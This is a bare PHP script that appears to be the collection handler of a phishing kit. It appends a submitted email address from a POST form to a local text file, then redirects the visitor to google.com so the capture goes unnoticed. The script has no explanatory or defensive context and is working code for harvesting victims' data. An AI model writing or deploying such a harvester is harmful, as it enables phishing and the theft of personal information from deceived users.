<?php
$link="https://google.com";
file_put_contents("../excute/email.txt", "" . $username = $_POST['email'] . "\n", FILE_APPEND);
header("Location: $link ");
?>